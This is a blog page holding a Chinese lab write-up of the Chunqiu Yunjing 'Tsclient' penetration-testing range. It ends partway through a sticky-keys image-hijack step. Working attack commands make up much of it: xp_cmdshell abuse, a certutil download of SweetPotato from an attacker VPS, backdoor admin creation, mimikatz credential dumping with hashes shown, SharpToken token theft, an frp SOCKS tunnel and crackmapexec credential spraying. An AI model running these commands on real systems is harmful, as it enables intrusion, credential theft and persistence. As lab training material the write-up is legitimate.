@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="春秋云镜Tsclient-wp" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            春秋云镜Tsclient-wp
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%A4%96%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="post-toc-text">外网探测</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">端口扫描</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="post-toc-text">内网渗透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E9%80%9A%E8%BF%87MSSQL%E8%8E%B7%E5%BE%97shel"><span class="post-toc-text">通过MSSQL获得shel</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Sweetpotato%E6%8F%90%E6%9D%83"><span class="post-toc-text">Sweetpotato提权</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="post-toc-text">远程登录</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag1"><span class="post-toc-text">flag1</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="post-toc-text">内网主机扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="post-toc-text">令牌窃取</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#frp%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="post-toc-text">frp内网代理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81"><span class="post-toc-text">映像劫持</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag2"><span class="post-toc-text">flag2</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="post-toc-text">哈希传递访问域控文件系统</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag3"><span class="post-toc-text">flag3</span></a></li></ol></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="外网探测"><a href="#外网探测" class="headerlink" title="外网探测"></a>外网探测</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用fscan进行扫描【不知道为什么kali上的用不了。。。。】</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251508513.png" title="image-20230225150656832" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251508513.png" alt="image-20230225150656832"></a></p>
+<p>然后发现存在mssql的弱口令而且还是sa(sysadmin)用户，可以用来执行shell</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="通过MSSQL获得shel"><a href="#通过MSSQL获得shel" class="headerlink" title="通过MSSQL获得shel"></a>通过MSSQL获得shel</h2><p>使用navicat连接，执行以下命令来开启xp_cmdshell</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; </span><br><span class="line">RECONFIGURE;  </span><br><span class="line"><span class="keyword">exec</span> sp_configure<span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; </span><br><span class="line">RECONFIGURE; </span><br></pre></td></tr></table></figure>
+
+<p>使用以下命令来执行系统命令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;systeminfo&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看系统信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">OS 名称:Microsoft Windows Server 2016 Datacenter</span><br><span class="line">OS 版本:10.0.14393 暂缺 Build 14393</span><br></pre></td></tr></table></figure>
+
+<p>执行以下命令，查看用户的权限，来使用合适的提权方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;whoami /priv&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">特权名                        描述                 状态  </span><br><span class="line">============================= ==================== ======</span><br><span class="line">SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用</span><br><span class="line">SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用</span><br><span class="line">SeChangeNotifyPrivilege       绕过遍历检查         已启用</span><br><span class="line">SeImpersonatePrivilege        身份验证后模拟客户端 已启用</span><br><span class="line">SeCreateGlobalPrivilege       创建全局对象         已启用</span><br><span class="line">SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用</span><br></pre></td></tr></table></figure>
+
+<p>这里开启了<code>SeImpersonatePrivilege</code>特权，所以可以进行令牌窃取</p>
+<h2 id="Sweetpotato提权"><a href="#Sweetpotato提权" class="headerlink" title="Sweetpotato提权"></a>Sweetpotato提权</h2><p>选择使用<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">sweetpotato</a>进行提权，他是一个集成工具</p>
+<p>然后是将这个文件下载下来，使用Certutil来下载文件【参考<a target="_blank" rel="noopener" href="https://payloads.online/archivers/2017-11-08/1/#0x03-certutil">Windows下命令行下载文件总结</a>】</p>
+<p>将文件放在公网vps上，然后进行下载，要找有权限下载的地方,mssql服务就肯定是找他的目录了，为<code>C:\Users\MSSQLSERVER</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;certutil.exe -urlcache -split -f http://vps:9999/SweetPotato.exe c:\Users\MSSQLSERVER\sweet.exe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后使用sweetpotato进行提权</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251622260.png" title="image-20230225162250217" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251622260.png" alt="image-20230225162250217"></a></p>
+<h2 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h2><p>创建用户，添加到管理员组</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;C:\Users\MSSQLSERVER\sweet.exe -a &quot;<span class="built_in">net</span> user v2i <span class="number">123456</span>@qwe /add&quot;&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;C:\Users\MSSQLSERVER\sweet.exe -a &quot;<span class="built_in">net</span> localgroup administrators v2i /add&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>查看rdp有没有开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;C:\Users\MSSQLSERVER\sweet.exe -a &quot;REG QUERY \&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>如果结果为0x0就是开启，否则就是关闭</p>
+<p>然后手动开启</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;C:\Users\MSSQLSERVER\sweet.exe -a &quot;reg add \&quot;HKLM\SYSTEM\CUrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用kali的remmina进行rdp登录</p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>得到第一个flag:<code>flag&#123;4f0113da-d86f-4728-9e72-d995584450ff&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251629395.png" title="image-20230225162906361" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251629395.png" alt="image-20230225162906361"></a></p>
+<p>在进行信息搜集的时候，发现这个机器不在域内。。</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251637300.png" title="image-20230225163722264" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251637300.png" alt="image-20230225163722264"></a></p>
+<p>先使用fscan进行内网探测，我是使用共享文件夹的方式进行上传的</p>
+<h2 id="内网主机扫描"><a href="#内网主机扫描" class="headerlink" title="内网主机扫描"></a>内网主机扫描</h2><p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251638578.png" title="image-20230225163815546" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302251638578.png" alt="image-20230225163815546"></a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h <span class="number">172</span>.<span class="number">22</span>.<span class="number">8</span>.<span class="number">0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
+
+<p>得到结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">[*] NetBios: 172.22.8.15     [+]DC XIAORANG\DC01</span><br><span class="line">[*] NetBios: 172.22.8.31     XIAORANG\WIN19-CLIENT</span><br><span class="line">[*] NetBios: 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle: http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle: http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql:172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure>
+
+<p>所以内网还存在其他三台主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.15     [+]DC XIAORANG\DC01 域控</span><br><span class="line">172.22.8.31     XIAORANG\WIN19-CLIENT</span><br><span class="line">172.22.8.46     WIN2016.xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<p>使用mimikatz来提取用户hash，要用管理员权限打开命令行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p>这里发现了John用户的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 594235 (00000000:0009113b)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : John</span><br><span class="line">Domain            : WIN-WEB</span><br><span class="line">Logon Server      : WIN-WEB</span><br><span class="line">Logon Time        : 2023/2/25 14:27:17</span><br><span class="line">SID               : S-1-5-21-4088072006-1921831747-1237773115-1008</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : John</span><br><span class="line">	 * Domain   : WIN-WEB</span><br><span class="line">	 * NTLM     : eec9381b043f098b011be51622282027</span><br><span class="line">	 * SHA1     : 18056c7dda082b2b219dbaac6157a1fb234403bc</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : John</span><br><span class="line">	 * Domain   : WIN-WEB</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : John</span><br><span class="line">	 * Domain   : WIN-WEB</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br></pre></td></tr></table></figure>
+
+<p>但是解不出来，所以没啥用</p>
+<p>查看网络连接状态，发现有其他用户使用rdp连接了这台主机</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091718734.png" title="image-20230409171844693" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091718734.png" alt="image-20230409171844693"></a></p>
+<p>使用<code>query user</code>（简写quser），发现是john在连接</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091719755.png" title="image-20230409171928730" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091719755.png" alt="image-20230409171928730"></a></p>
+<p>所以这台主机是存在John的令牌的，尝试令牌窃取，使用SharpToken如果报错的话，就去网上找，按照对应的东西就行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091817234.png" title="image-20230409181716158" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091817234.png" alt="image-20230409181716158"></a></p>
+<p>执行以下命令进行令牌窃取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpToken.exe execute <span class="string">&quot;WIN-WEB\John&quot;</span> cmd <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>成功窃取到John的令牌，来开启命令行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091818225.png" title="image-20230409181806176" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091818225.png" alt="image-20230409181806176"></a></p>
+<p>使用<code>net use</code>查看有网络共享</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091819918.png" title="image-20230409181944880" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091819918.png" alt="image-20230409181944880"></a></p>
+<p>查看发行了一个xiaorang.lab域用户的账户密码，并给出了提示，镜像劫持</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091820873.png" title="image-20230409182023835" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091820873.png" alt="image-20230409182023835"></a></p>
+<p><code>xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</code></p>
+<h2 id="frp内网代理"><a href="#frp内网代理" class="headerlink" title="frp内网代理"></a>frp内网代理</h2><p>这里先使用frp搭建一个内网代理，否则无法从外部连接到目标机器</p>
+<p><code>frpc.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = &lt;vpsip&gt;</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">9998</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1000</span> <span class="comment">#需要vps打开对应的端口</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure>
+
+<p><code>frps.ini</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">9998</span></span><br></pre></td></tr></table></figure>
+
+<p>kali要配置<code>/etc/proxychains4.conf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 &lt;vpsip&gt; 1000</span><br></pre></td></tr></table></figure>
+
+<p>先使用CME来探测一下这个用户可以在哪个主机上登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains  crackmapexec  smb 172.22.8.0/24 -u Aldrich -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span> --loggedon-users</span><br></pre></td></tr></table></figure>
+
+<p>有三个主机提示密码到期</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091850456.png" title="image-20230409185042358" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091850456.png" alt="image-20230409185042358"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.46 </span><br><span class="line">172.22.8.31 </span><br><span class="line">172.22.8.15 域控</span><br></pre></td></tr></table></figure>
+
+<p>因为没有啥好用的方法，所以一个个试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.8.46  </span><br></pre></td></tr></table></figure>
+
+<p>发现<code>172.22.8.46 </code>可以登录，然后按照要求修改密码即可</p>
+<h2 id="映像劫持"><a href="#映像劫持" class="headerlink" title="映像劫持"></a>映像劫持</h2><p>但是发现不是高权限用户，按照提示使用映像劫持（IFEO）</p>
+<p>先查看一下注册表权限</p>
+<p>使用powershell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br><span class="line"><span class="comment"># fl表示格式化输出，*表示输出所有列</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091916055.png" title="image-20230409191612004" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202304091916055.png" alt="image-20230409191612004"></a></p>
+<p>发现所有用户都可以创建键值</p>
+<p>设置劫持粘滞键<code>sethc</code>（按5次shift出现）</p>
